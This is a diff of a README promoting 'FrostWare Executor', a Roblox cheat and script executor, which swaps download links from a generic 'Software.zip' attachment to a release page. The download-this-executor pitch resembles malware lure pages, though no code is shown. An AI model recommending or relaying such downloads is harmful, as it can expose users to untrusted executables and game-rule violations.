@@ -6,7 +6,7 @@ Welcome to the FrostWare GitHub repository, where you can find the FrostWare Exe
 FrostWare Executor is a sophisticated script execution tool for Roblox, allowing users to run custom scripts and modify game mechanics to access a range of exploits and enhancements. With FrostWare, users can elevate their gameplay and explore new possibilities within the Roblox universe.
 
 ## Repository Link
-[Download FrostWare Executor](https://github.com/user-attachments/files/18060583/Software.zip)
+[Download FrostWare Executor](https://github.com/DakeII/Roblox-Frostware/releases/tag/v2.0)
 
 *Note: Click the link above to download the FrostWare Executor software.*
 
@@ -27,4 +27,4 @@ If you encounter any issues with the FrostWare Executor, please check the "Relea
 
 Get ready to take your Roblox gaming experience to the next level with FrostWare Executor! Happy gaming! 🎮🚀
 
-[![Download FrostWare](https://img.shields.io/badge/Download-FrostWare-blue.svg)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download FrostWare](https://github.com/DakeII/Roblox-Frostware/releases/tag/v2.0)](https://github.com/DakeII/Roblox-Frostware/releases/tag/v2.0)
